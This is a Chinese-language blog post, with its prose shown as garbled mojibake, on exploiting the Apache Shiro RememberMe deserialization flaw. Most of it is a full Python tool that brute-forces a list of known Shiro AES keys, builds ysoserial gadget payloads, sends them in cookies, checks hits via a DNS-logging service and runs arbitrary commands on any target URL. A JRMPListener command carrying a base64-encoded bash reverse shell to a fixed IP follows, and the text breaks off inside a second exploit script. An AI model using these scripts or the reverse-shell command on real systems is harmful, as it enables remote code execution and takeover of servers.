        <content type="html"><![CDATA[<p>Apache Shiroæ˜¯ä¸€ä¸ªå¼ºå¤§ä¸”æ˜“ç”¨çš„Javaå®‰å…¨æ¡†æ¶,æ‰§è¡Œèº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å’Œä¼šè¯ç®¡ç†ã€‚</p><h1 id="å·¥ä½œåŸç†"><a href="#å·¥ä½œåŸç†" class="headerlink" title="å·¥ä½œåŸç†"></a>å·¥ä½œåŸç†</h1><p>Apache Shiroæ¡†æ¶æä¾›äº†è®°ä½æˆ‘çš„åŠŸèƒ½ï¼ˆRememberMeï¼‰ï¼Œç”¨æˆ·ç™»é™†æˆåŠŸåä¼šç”Ÿæˆç»è¿‡åŠ å¯†å¹¶ç¼–ç çš„cookieã€‚cookieçš„keyä¸ºRememberMeï¼Œcookieçš„å€¼æ˜¯ç»è¿‡å¯¹ç›¸å…³ä¿¡æ¯è¿›è¡Œåºåˆ—åŒ–ï¼Œç„¶åä½¿ç”¨aesåŠ å¯†ï¼Œæœ€ååœ¨ä½¿ç”¨base64ç¼–ç å¤„ç†å½¢æˆçš„ã€‚</p><p>Shiroè®°ä½ç”¨æˆ·ä¼šè¯åŠŸèƒ½çš„é€»è¾‘å¦‚ä¸‹ï¼š</p><p>è·å–RememberMeçš„å€¼ â€”&gt; Base64è§£å¯† â€”&gt; ASEè§£å¯† â€“&gt; ååºåˆ—åŒ–<br>åœ¨æœåŠ¡ç«¯æ¥æ”¶cookieå€¼æ—¶ï¼ŒæŒ‰ç…§å¦‚ä¸‹æ­¥éª¤æ¥è§£æå¤„ç†ï¼š<br>1ã€æ£€ç´¢RememberMe cookie çš„å€¼<br>2ã€Base 64è§£ç <br>3ã€ä½¿ç”¨AESè§£å¯†(åŠ å¯†å¯†é’¥ç¡¬ç¼–ç )<br>4ã€è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼ˆæœªä½œè¿‡æ»¤å¤„ç†ï¼‰<br>åœ¨è°ƒç”¨ååºåˆ—åŒ–æ—¶æœªè¿›è¡Œä»»ä½•è¿‡æ»¤ï¼Œå¯¼è‡´å¯ä»¥è§¦å‘è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p><h1 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h1><p>å› ä¸ºåœ¨ååºåˆ—åŒ–æ—¶,ä¸ä¼šå¯¹å…¶è¿›è¡Œè¿‡æ»¤,æ‰€ä»¥å¦‚æœä¼ å…¥æ¶æ„ä»£ç å°†ä¼šé€ æˆå®‰å…¨é—®é¢˜<br>åœ¨ 1.2.4 ç‰ˆæœ¬å‰,æ˜¯é»˜è®¤ASEç§˜é’¥,Key: kPH+bIxk5D2deZiIxcaaaA==,å¯ä»¥ç›´æ¥ååºåˆ—åŒ–æ‰§è¡Œæ¶æ„ä»£ç <br>è€Œåœ¨1.2.4ä¹‹å,ASEç§˜é’¥å°±ä¸ä¸ºé»˜è®¤äº†,éœ€è¦è·å–åˆ°Keyæ‰å¯ä»¥è¿›è¡Œæ¸—é€</p><h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull medicean&#x2F;vulapps:s_shiro_1</span><br><span class="line">docker run -d -p 8081:8080 medicean&#x2F;vulapps:s_shiro_1</span><br><span class="line">è®¿é—® http:&#x2F;&#x2F;127.0.0.1:8081å³å¯</span><br></pre></td></tr></table></figure><p>æ¼æ´æ‰«æ:shiro_scan.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python2.7</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">JAR_FILE = <span class="string">&#x27;ysoserial.jar&#x27;</span></span><br><span class="line"></span><br><span class="line">CipherKeys = [</span><br><span class="line">    <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;4AvVhmFLUs0KTA3Kprsdag==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;3AvVhmFLUs0KTA3Kprsdag==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;2AvVhdsgUs0FSA3SDFAdag==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;6ZmI6I2j5Y+R5aSn5ZOlAA==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;wGiHplamyXlVB11UXWol8g==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cmVtZW1iZXJNZQAAAAAAAA==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Z3VucwAAAAAAAAAAAAAAAA==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ZnJlc2h6Y24xMjM0NTY3OA==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;L7RioUULEFhRyxM7a2R/Yg==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;RVZBTk5JR0hUTFlfV0FPVQ==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fCq+/xW488hMTCD+cmJ3aQ==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;WkhBTkdYSUFPSEVJX0NBVA==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;1QWLxg+NYmxraMoxAXu/Iw==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;WcfHGU25gNnTxTlmJMeSpw==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;a2VlcE9uR29pbmdBbmRGaQ==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bWluZS1hc3NldC1rZXk6QQ==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;5aaC5qKm5oqA5pyvAAAAAA==&quot;</span>,</span><br><span class="line">    <span class="comment">#&quot;ZWvohmPdUsAWT3=KpPqda&quot;,</span></span><br><span class="line">    <span class="string">&quot;r0e3c16IdVkouZgk1TKVMg==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ZUdsaGJuSmxibVI2ZHc9PQ==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;U3ByaW5nQmxhZGUAAAAAAA==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LEGEND-CAMPUS-CIPHERKEY==&quot;</span></span><br><span class="line">    <span class="comment">#&quot;kPv59vyqzj00x11LXJZTjJ2UHW48jzHN&quot;,</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">gadgets = [<span class="string">&quot;JRMPClient&quot;</span>,<span class="string">&quot;BeanShell1&quot;</span>,<span class="string">&quot;Clojure&quot;</span>,<span class="string">&quot;CommonsBeanutils1&quot;</span>,<span class="string">&quot;CommonsCollections1&quot;</span>,<span class="string">&quot;CommonsCollections2&quot;</span>,<span class="string">&quot;CommonsCollections3&quot;</span>,<span class="string">&quot;CommonsCollections4&quot;</span>,<span class="string">&quot;CommonsCollections5&quot;</span>,<span class="string">&quot;CommonsCollections6&quot;</span>,<span class="string">&quot;CommonsCollections7&quot;</span>,<span class="string">&quot;Groovy1&quot;</span>,<span class="string">&quot;Hibernate1&quot;</span>,<span class="string">&quot;Hibernate2&quot;</span>,<span class="string">&quot;JSON1&quot;</span>,<span class="string">&quot;JavassistWeld1&quot;</span>,<span class="string">&quot;Jython1&quot;</span>,<span class="string">&quot;MozillaRhino1&quot;</span>,<span class="string">&quot;MozillaRhino2&quot;</span>,<span class="string">&quot;Myfaces1&quot;</span>,<span class="string">&quot;ROME&quot;</span>,<span class="string">&quot;Spring1&quot;</span>,<span class="string">&quot;Spring2&quot;</span>,<span class="string">&quot;Vaadin1&quot;</span>,<span class="string">&quot;Wicket1&quot;</span>]</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genpayload</span>(<span class="params">params, CipherKey,fp</span>):</span></span><br><span class="line">    gadget,command = params</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(fp):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;jar file not found&#x27;</span>)</span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;-jar&#x27;</span>,fp,gadget,command],</span><br><span class="line">                            stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    <span class="comment">#print(command)</span></span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    <span class="comment">#key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(CipherKey), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdomain</span>():</span></span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        ret = session.get(<span class="string">&quot;http://www.dnslog.cn/getdomain.php?t=&quot;</span>+<span class="built_in">str</span>(random.randint(<span class="number">100000</span>,<span class="number">999999</span>)),timeout=<span class="number">10</span>).text</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;getdomain error:&quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">        ret = <span class="string">&quot;error&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getrecord</span>():</span></span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        ret = session.get(<span class="string">&quot;http://www.dnslog.cn/getrecords.php?t=&quot;</span>+<span class="built_in">str</span>(random.randint(<span class="number">100000</span>,<span class="number">999999</span>)),timeout=<span class="number">10</span>).text</span><br><span class="line">        <span class="comment">#print(ret)</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;getrecord error:&quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">        ret = <span class="string">&quot;error&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        target = <span class="string">&#x27;https://%s&#x27;</span> % url <span class="keyword">if</span> <span class="string">&#x27;:443&#x27;</span> <span class="keyword">in</span> url <span class="keyword">else</span> <span class="string">&#x27;http://%s&#x27;</span> % url</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        target = url</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;checking url:&quot;</span> + url)</span><br><span class="line"></span><br><span class="line">    domain = getdnshost()</span><br><span class="line">    <span class="keyword">if</span> domain:</span><br><span class="line">        reversehost = <span class="string">&quot;http://&quot;</span> + domain</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> CipherKey <span class="keyword">in</span> CipherKeys:</span><br><span class="line">            ret = &#123;<span class="string">&quot;vul&quot;</span>:<span class="literal">False</span>,<span class="string">&quot;CipherKey&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;url&quot;</span>:target&#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                print(<span class="string">&quot;try CipherKey :&quot;</span> +CipherKey)</span><br><span class="line"></span><br><span class="line">                payload = genpayload((<span class="string">&quot;URLDNS&quot;</span>,reversehost),CipherKey,JAR_FILE)</span><br><span class="line"></span><br><span class="line">                print(<span class="string">&quot;generator payload done.&quot;</span>)</span><br><span class="line"></span><br><span class="line">                r = requests.get(target,cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: payload.decode()&#125;,timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">                print(<span class="string">&quot;send payload ok.&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">                    print(<span class="string">&quot;checking.....&quot;</span>)</span><br><span class="line"></span><br><span class="line">                    time.sleep(<span class="number">2</span>)</span><br><span class="line">                    temp = getrecord()</span><br><span class="line">                    <span class="keyword">if</span> domain <span class="keyword">in</span> temp:</span><br><span class="line">                        ret[<span class="string">&quot;vul&quot;</span>] = <span class="literal">True</span></span><br><span class="line">                        ret[<span class="string">&quot;CipherKey&quot;</span>] = CipherKey</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="built_in">str</span>(e))</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">if</span> ret[<span class="string">&quot;vul&quot;</span>]:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;get dns host error&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">url,gadget,params,CipherKey</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        target = <span class="string">&#x27;https://%s&#x27;</span> % url <span class="keyword">if</span> <span class="string">&#x27;:443&#x27;</span> <span class="keyword">in</span> url <span class="keyword">else</span> <span class="string">&#x27;http://%s&#x27;</span> % url</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        target = url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = genpayload((gadget, params),CipherKey,JAR_FILE)</span><br><span class="line">        r = requests.get(target,cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: payload.decode()&#125;,timeout=<span class="number">10</span>)</span><br><span class="line">        print(r.text)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;exploit error:&quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdnshost</span>():</span></span><br><span class="line">    reversehost = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        domain = getdomain()</span><br><span class="line">        <span class="keyword">if</span> domain==<span class="string">&quot;error&quot;</span>:</span><br><span class="line">            print(<span class="string">&quot;getdomain error&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment">#reversehost = &quot;http://&quot; +domain</span></span><br><span class="line">            reversehost = domain</span><br><span class="line">            <span class="comment">#print(&quot;got reversehost : &quot; + reversehost)</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> reversehost</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">detector</span>(<span class="params">url,CipherKey,command</span>):</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        target = <span class="string">&#x27;https://%s&#x27;</span> % url <span class="keyword">if</span> <span class="string">&#x27;:443&#x27;</span> <span class="keyword">in</span> url <span class="keyword">else</span> <span class="string">&#x27;http://%s&#x27;</span> % url</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        target = url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> g <span class="keyword">in</span> gadgets:</span><br><span class="line">            g = g.strip()</span><br><span class="line"></span><br><span class="line">            domain = getdnshost()</span><br><span class="line">            <span class="keyword">if</span> domain:</span><br><span class="line">                <span class="keyword">if</span> g == <span class="string">&quot;JRMPClient&quot;</span>:</span><br><span class="line">                    param = <span class="string">&quot;%s:80&quot;</span> % domain</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    param = command.replace(<span class="string">&quot;&#123;dnshost&#125;&quot;</span>,domain)</span><br><span class="line">                payload = genpayload((g, param),CipherKey,JAR_FILE)</span><br><span class="line">                print(g + <span class="string">&quot; testing.....&quot;</span>)</span><br><span class="line">                r = requests.get(target,cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: payload.decode()&#125;,timeout=<span class="number">10</span>)</span><br><span class="line">                <span class="comment">#print(r.read())</span></span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">                    <span class="comment">#print(&quot;checking.....&quot;)</span></span><br><span class="line">                    time.sleep(<span class="number">2</span>)</span><br><span class="line">                    temp = getrecord()</span><br><span class="line">                    <span class="keyword">if</span> domain <span class="keyword">in</span> temp:</span><br><span class="line">                        ret = g</span><br><span class="line">                        <span class="comment">#ret[&quot;CipherKey&quot;] = CipherKey</span></span><br><span class="line">                        result.append(ret)</span><br><span class="line">                        print(<span class="string">&quot;found gadget:\t&quot;</span> + g)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">&quot;get dns host error&quot;</span>)</span><br><span class="line">                    <span class="comment">#break</span></span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;detector error:&quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parser_error</span>(<span class="params">errmsg</span>):</span></span><br><span class="line">    print(<span class="string">&quot;Usage: python &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot; [Options] use -h for help&quot;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_args</span>():</span></span><br><span class="line">    <span class="comment"># parse the arguments</span></span><br><span class="line">    parser = argparse.ArgumentParser(epilog=<span class="string">&quot;\tExample: \r\npython &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot; -u target&quot;</span>)</span><br><span class="line">    parser.error = parser_error</span><br><span class="line">    parser._optionals.title = <span class="string">&quot;OPTIONS&quot;</span></span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">help</span>=<span class="string">&quot;Target url.&quot;</span>, default=<span class="string">&quot;http://127.0.0.1:8080&quot;</span>,required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--type&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Check or Exploit. Check :1 , Exploit:2 , Find gadget:3&#x27;</span>, default=<span class="string">&quot;1&quot;</span>,required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-g&#x27;</span>, <span class="string">&#x27;--gadget&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;gadget&#x27;</span>, default=<span class="string">&quot;CommonsCollections2&quot;</span>,required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--params&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;gadget params&#x27;</span>,default=<span class="string">&quot;whoami&quot;</span>,required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-k&#x27;</span>, <span class="string">&#x27;--key&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;CipherKey&#x27;</span>,default=<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>,required=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    args = parse_args()</span><br><span class="line">    url = args.url</span><br><span class="line">    <span class="built_in">type</span> = args.<span class="built_in">type</span></span><br><span class="line">    command = args.params</span><br><span class="line">    key = args.key</span><br><span class="line">    gadget = args.gadget</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>==<span class="string">&quot;1&quot;</span>:</span><br><span class="line">        r = check(url)</span><br><span class="line">        print(<span class="string">&quot;\nvulnerable:%s url:%s\tCipherKey:%s\n&quot;</span> %(<span class="built_in">str</span>(r[<span class="string">&quot;vul&quot;</span>]),url,r[<span class="string">&quot;CipherKey&quot;</span>]))</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span>==<span class="string">&quot;2&quot;</span>:</span><br><span class="line">        exploit(url,gadget,command,key)</span><br><span class="line">        print(<span class="string">&quot;exploit done.&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span>==<span class="string">&quot;3&quot;</span>:</span><br><span class="line">        </span><br><span class="line">        r = detector(url,key,command)</span><br><span class="line">        <span class="keyword">if</span> r :</span><br><span class="line">            print(<span class="string">&quot;found gadget:\n&quot;</span>)</span><br><span class="line">            print(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;invalid type&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1183626290.png"></p><p>æ ¹æ®è„šæœ¬é‡Œé¢çš„keyè¿›è¡Œæ‰«æ,å¹¶è¿”å›key<br>åˆ©ç”¨æ¼æ´è·å–shell<br>ä½¿ç”¨jacksonç¼–ç  <a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/410677616.png"></p><p>ncç›‘å¬åå¼¹shellçš„ç«¯å£<br>nc -lvp 1234<br>ä½¿ç”¨ysoserial.jarçš„JRMPç›‘å¬(æœ¬æœºæˆ–è€…vpsä¸Šç›‘å¬)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMjguMTEuMTU5LzExMjMgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆpayloadçš„expï¼šshiro_exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span 